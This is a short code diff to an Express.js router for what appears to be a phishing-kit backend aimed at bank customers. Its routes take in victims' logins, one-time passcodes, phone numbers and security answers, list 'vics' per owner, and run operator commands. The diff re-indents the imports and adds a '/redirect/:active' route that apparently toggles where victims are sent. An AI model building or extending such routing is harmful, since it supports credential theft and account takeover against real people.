@@ -1,14 +1,15 @@
 const express = require("express");
 const {
-  getOwnerVics,
-  command,
-  getInfo,
-  submitLogin,
-  submitLoginAgain,
-  submitOtp,
-  submitTelephone,
-  submitQuestion,
-  deleteEntry,
+	getOwnerVics,
+	command,
+	getInfo,
+	submitLogin,
+	submitLoginAgain,
+	submitOtp,
+	submitTelephone,
+	submitQuestion,
+	deleteEntry,
+	setRedirect,
 } = require("../controllers/rbcController");
 
 const router = express.Router();
@@ -22,5 +23,6 @@ router.post("/otp", submitOtp);
 router.post("/telephone", submitTelephone);
 router.post("/question", submitQuestion);
 router.post("/delete", deleteEntry);
+router.get("/redirect/:active", setRedirect);
 
 module.exports = router;
